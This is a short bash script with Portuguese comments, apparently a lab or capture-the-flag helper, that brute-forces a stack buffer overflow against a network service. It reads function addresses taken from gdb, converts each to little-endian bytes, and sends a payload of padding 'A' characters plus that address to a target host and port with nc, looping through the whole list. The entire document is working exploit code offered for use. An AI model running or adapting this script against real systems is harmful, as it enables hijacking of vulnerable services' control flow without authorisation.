#!/bin/bash

#Autor: Izael Magalhaes
#Compilado 04.04.2022
#izaelbm.com.br
#Script Part2
#Utilizado para dar bypass BoF

#gdb -q binario
#info functions

#copie todo a saida para um arquivo texto

#cat list.txt
#0x0804836c  _init
#0x080483ac  __gmon_start__@plt

#Modo de Uso: ./bof_enum.sh 192.168.0.1 80 list.txt 1036


#Definindo Variaveis
host=$1
port=$2
file=$3
buff_size=$4

mode="Modo de Uso: ./bof_enum_functions.sh 192.168.0.1 80 list.txt 1036"

if [[ $4 -eq 0 ]] ; then
    echo $mode
    exit 1
fi

echo " "

#Lendo arquivo com funcoes
cat $file | cut -d " " -f 1 > addr.txt

#percorrendo a lista
for i in $(cat addr.txt)
do
        #Montando Endereco LittleIndia
        addr=("\x"${i:8:2}"\x"${i:6:2}"\x"${i:4:2}"\x"${i:2:2})

        #Montando e Enviando o Paylaod
        recv=$(python2 -c "print('A' * "$buff_size" + '"$addr"')" | nc -v $host $port)

        #pausando a execucao 1 seg
        sleep 1

        echo " "
done
echo "Concluido"
